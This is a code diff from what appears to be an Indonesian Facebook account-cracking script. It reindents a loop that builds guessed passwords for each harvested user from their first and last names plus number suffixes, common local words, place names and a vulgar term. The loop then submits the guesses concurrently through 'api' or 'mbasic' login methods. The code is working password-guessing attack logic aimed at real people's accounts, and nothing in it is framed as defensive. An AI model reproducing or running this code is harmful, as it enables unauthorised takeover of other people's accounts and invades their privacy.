@@ -249,59 +249,59 @@ class Crack:
 			with ThreadPoolExecutor(max_workers=30) as fall:
 				self.simpan_hasil()
 				for data in tampung:
-				    try:
-					    pwx = []
-					    user = data.split("<=>")[0]
-					    nama = data.split("<=>")[1]
-					    depan = nama.split(" ")[0]
-					    if len(nama)<=5:
-						    if len(depan)<3:
-							    pass 
-						    else:
-							     pwx.append(depan+"123")
-							     pwx.append(depan+"321")
-							     pwx.append(depan+"1234")
-							     pwx.append(depan+"12345")
-							     pwx.append("ganteng")
-							     pwx.append("sayangku")
-							     pwx.append("ganteng123")
-							     pwx.append("katasandi")
-							     pwx.append("pekalongan")
-							     pwx.append("semarang")
-					      else:
+					try:
+						pwx = []
+						user = data.split("<=>")[0]
+						nama = data.split("<=>")[1]
+						depan = nama.split(" ")[0]
+						if len(nama)<=5:
 							if len(depan)<3:
-							     pwx.append(nama)
-							     pwx.append(nama+"123")
-							     pwx.append(nama+"321")
+								pass 
 							else:
-							     pwx.append(nama)
-							     pwx.append(depan+"123")
-							     pwx.append(depan+"321")
-							     pwx.append(depan+"1234")
-								 pwx.append(depan+"12345")
-								 pwx.append("kata sandi")
-								 pwx.append("pekalongan")
-								 pwx.append("semarang")
+								pwx.append(depan+"123")
+								pwx.append(depan+"321")
+								pwx.append(depan+"1234")
+								pwx.append(depan+"12345")
+								pwx.append("ganteng")
+								pwx.append("sayangku")
+								pwx.append("ganteng123")
+								pwx.append("katasandi")
+								pwx.append("pekalongan")
+								pwx.append("semarang")
+						else:
+							if len(depan)<3:
+								pwx.append(nama)
+								pwx.append(nama+"123")
+								pwx.append(nama+"321")
+							else:
+								pwx.append(nama)
+								pwx.append(depan+"123")
+								pwx.append(depan+"321")
+								pwx.append(depan+"1234")
+								pwx.append(depan+"12345")
+								pwx.append("kata sandi")
+								pwx.append("pekalongan")
+								pwx.append("semarang")
 							belakang = nama.split(" ")[1]
 							if len(belakang)<3:
-								 pwx.append(depan+belakang)
-								 pwx.append(depan+belakang+"123")
-								 pwx.append(depan+belakang+"321")
-								 pwx.append(depan+belakang+"1234")
-								 pwx.append(depan+belakang+"12345")
+								pwx.append(depan+belakang)
+								pwx.append(depan+belakang+"123")
+								pwx.append(depan+belakang+"321")
+								pwx.append(depan+belakang+"1234")
+								pwx.append(depan+belakang+"12345")
 							else:
-								 pwx.append(depan+belakang)
-								 pwx.append(belakang+"123")
-								 pwx.append(belakang+"321")
-								 pwx.append(belakang+"1234")
-								 pwx.append(belakang+"12345")
-								 pwx.append("kontol")
-								 pwx.append("kontol123")
-								 pwx.append("bismillah")
-								 pwx.append("mobile legends")
-								 pwx.append("batang")
-								 pwx.append("pemalang")
-								 pwx.append("paninggaran")
+								pwx.append(depan+belakang)
+								pwx.append(belakang+"123")
+								pwx.append(belakang+"321")
+								pwx.append(belakang+"1234")
+								pwx.append(belakang+"12345")
+								pwx.append("kontol")
+								pwx.append("kontol123")
+								pwx.append("bismillah")
+								pwx.append("mobile legends")
+								pwx.append("batang")
+								pwx.append("pemalang")
+								pwx.append("paninggaran")
 					if "api" in self.mtd:
 						fall.submit(self.metode_api,user,pwx)
 					elif "mbasic" in self.mtd:
